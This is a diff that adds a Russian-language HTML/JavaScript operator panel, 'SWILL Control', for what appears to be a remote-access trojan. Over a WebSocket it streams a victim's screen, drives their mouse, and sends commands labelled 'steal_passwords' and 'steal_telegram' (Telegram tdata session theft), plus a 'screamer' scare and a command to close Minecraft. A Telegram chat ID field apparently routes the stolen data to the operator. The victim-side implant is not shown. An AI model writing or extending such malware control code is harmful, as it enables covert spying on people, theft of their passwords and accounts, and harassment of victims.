@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<title>SWILL Control</title>
+<style>
+  body { background: #0b0d14; color: #fff; font-family: sans-serif; padding: 20px; text-align: center; }
+  #screen { max-width: 100%; border: 2px solid #3b82f6; cursor: crosshair; margin-top: 10px; display: none; }
+  .controls { margin: 10px; }
+  button { padding: 10px 20px; background: #3b82f6; color: #fff; border: none; border-radius: 6px; cursor: pointer; margin: 5px; }
+  button:hover { background: #2563eb; }
+  .btn-red { background: #ef4444; } .btn-red:hover { background: #dc2626; }
+  .btn-purple { background: #8b5cf6; }
+</style>
+</head>
+<body>
+  <h1>Удаленное управление</h1>
+  
+  <input type="text" id="tgId" placeholder="Telegram Chat ID" style="padding: 10px; border-radius: 6px; border: none;" onchange="setTg()">
+  
+  <div class="controls">
+    <button onclick="startStream()">▶ Экран</button>
+    <button onclick="stopStream()" class="btn-red">⏹ Стоп</button>
+    <button onclick="cmd('steal_passwords')" class="btn-purple">🔐 Пароли</button>
+    <button onclick="cmd('steal_telegram')" class="btn-purple">✈️ Telegram (tdata)</button>
+    <button onclick="cmd('screamer')">💀 Скример</button>
+    <button onclick="cmd('close_minecraft')" class="btn-red">❌ Закрыть игру</button>
+  </div>
+
+  <img id="screen" onmousedown="mouseClick(event)" oncontextmenu="event.preventDefault(); mouseClick(event, 3); return false;">
+  <div id="status" style="margin-top:10px; color:#94a3b8;">Ожидание...</div>
+
+<script>
+  const token = prompt('Admin Token:');
+  const ws = new WebSocket(`wss://${location.host}/panel?token=${token}`);
+  const clientId = prompt('Введи ник клиента (например, kirya@DESKTOP):');
+
+  ws.onmessage = e => {
+    const msg = JSON.parse(e.data);
+    if (msg.type === 'screen_frame') {
+      const img = document.getElementById('screen');
+      img.src = 'data:image/jpeg;base64,' + msg.data;
+      img.style.display = 'block';
+      img.naturalWidth = msg.w; img.naturalHeight = msg.h;
+      document.getElementById('status').innerText = `Разрешение: ${msg.w}x${msg.h}`;
+    }
+  };
+
+  async function setTg() {
+    const chatId = document.getElementById('tgId').value;
+    await fetch('/api/set-tg', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chatId }) });
+    alert('ID сохранен');
+  }
+
+  function cmd(c) { ws.send(JSON.stringify({ clientId: clientId, payload: { cmd: c } })); }
+  function startStream() { cmd('start_stream'); }
+  function stopStream() { cmd('stop_stream'); }
+
+  function mouseClick(e, btn = 1) {
+    const img = document.getElementById('screen');
+    const rect = img.getBoundingClientRect();
+    const x = Math.round((e.clientX - rect.left) * (img.naturalWidth / rect.width));
+    const y = Math.round((e.clientY - rect.top) * (img.naturalHeight / rect.height));
+    ws.send(JSON.stringify({ clientId: clientId, payload: { cmd: "mouse_move", x: x * 2, y: y * 2 } }));
+    setTimeout(() => { ws.send(JSON.stringify({ clientId: clientId, payload: { cmd: "mouse_click", button: btn } })); }, 50);
+  }
+</script>
+</body>
+</html>
